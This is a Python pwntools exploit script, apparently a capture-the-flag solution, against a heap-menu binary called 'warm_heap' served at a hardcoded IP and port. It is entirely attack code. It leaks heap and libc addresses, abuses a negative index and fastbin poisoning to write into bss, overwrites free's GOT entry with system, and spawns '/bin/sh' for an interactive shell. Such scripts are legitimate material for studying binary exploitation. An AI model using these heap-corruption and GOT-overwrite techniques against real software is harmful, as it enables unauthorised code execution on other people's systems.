from pwn import *

prompt = '>> '
bss = 0x602108
LIBC = './libc.so.6'
HOST, PORT = "35.196.164.210", 9999


def add(idx, size, payload):
    p.sendlineafter(prompt, '1')
    p.sendlineafter('index: ', str(idx))
    p.sendlineafter('size: ', str(size))
    if len(payload) < size:
        payload += '\n'
    p.sendafter('input: ', payload)


def edit(idx, payload):
    p.sendlineafter(prompt, '2')
    p.sendlineafter('index: ', str(idx))
    p.sendlineafter('input: ', payload)


def remove(idx):
    p.sendlineafter(prompt, '3')
    p.sendlineafter('index: ', str(idx))


def view(idx):
    p.sendlineafter(prompt, '4')
    p.sendlineafter('index: ', str(idx))
    return p.recvline()


if __name__ == '__main__':
    if sys.argv[1] == 'local':
        p = process('./warm_heap', env={'LD_PRELOAD':LIBC})
    else:
        p = remote(HOST, PORT)
    e = ELF('./warm_heap')
    libc = ELF(LIBC)
    add(0, 10, 'asdf')
    add(1, 10, 'asdf')
    remove(1)
    remove(0)
    add(0, 0, '')
    heap = u64(('\x00'+view(0).strip()).ljust(8, '\x00'))
    log.success("Leaked heap @ {}".format(hex(heap)))
    add(1, 10, 'asdf')
    add(2, 0x80, 'blah')
    add(3, 10, 'asdf')
    remove(2)
    add(2, 0, '')
    libc.address = u64(view(2).strip().ljust(8, '\x00')) - 0x399bd8
    log.success("Leaked libc @ {}".format(hex(libc.address)))
    system = libc.symbols['system']
    log.success("System @ {}".format(hex(system)))
    add(4, 0x60, 'asdf')
    add(5, 0x60, 'asdf')
    add(6, heap+0x70, 'blah')
    remove(4)
    remove(5)
    remove(-6)
    add(9, 0x71, 'asdf')
    add(4, 0x60, p64(bss-8))
    add(5, 0x60, 'asdf')
    add(6, 0x60, 'blah')
    payload = "/bin/sh\x00"+"A"*16
    payload += p64(e.got['free'])
    add(8, 0x60, payload)
    edit(1, p64(system)[:6])
    remove(8)
    p.interactive()
